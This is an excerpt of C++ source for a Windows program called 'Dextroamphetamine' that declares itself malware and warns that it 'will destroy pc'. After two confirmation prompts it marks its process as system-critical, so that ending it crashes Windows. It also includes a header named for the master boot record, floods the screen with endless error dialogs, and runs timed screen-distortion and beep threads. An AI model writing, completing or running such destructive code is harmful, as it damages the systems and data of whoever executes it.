// Dextroamphetamine.cpp : Defines the entry point for the application.
//

#include "Dextroamphetamine.h"
#include "RGDI.h"
#include "BEaTer.h"
#include "MBR.h"
...
DWORD WINAPI mightyball(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"\n\n\n\n\n\n\n\n\n", L"", MB_ICONERROR | MB_ABORTRETRYIGNORE | MB_RTLREADING); //a caesar cipher for "Are you really that stupid?"
	}
	return 0;
}
...
int WINAPI WinMain(HINSTANCE hia,
	...
	if (MessageBoxW(NULL, L"warning! \nthis is a malware, are you sure to run malware, \nrun?", L"Dextroamphetamine.exe", MB_YESNO | MB_SYSTEMMODAL) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Are You Sure? \nyou will destroy pc!", L"Dextroamphetamine.exe", MB_YESNO | MB_SYSTEMMODAL) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			...
			HANDLE gdi3d2 = CreateThread(0, 0, gdis3::RGDI2, 0, 0, 0);
			sfx3();
			Sleep(30000);
			TerminateThread(gdi3, 0);
			CloseHandle(gdi3);
			TerminateThread(gdi3d2, 0);
			CloseHandle(gdi3d2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			...
			HANDLE gdi8d2 = CreateThread(0, 0, gdis8::RGDI2, 0, 0, 0);
			sfx8();
			Sleep(30000);
			TerminateThread(gdi8, 0);
			CloseHandle(gdi8);
			TerminateThread(gdi8d2, 0);
			CloseHandle(gdi8d2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			...
			HANDLE beep1 = CreateThread(0, 0, beepsound, 0, 0, 0);
			Sleep(5000);
			TerminateThread(gdi11, 0);
			CloseHandle(gdi11);
			TerminateThread(beep1, 0);
			CloseHandle(beep1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
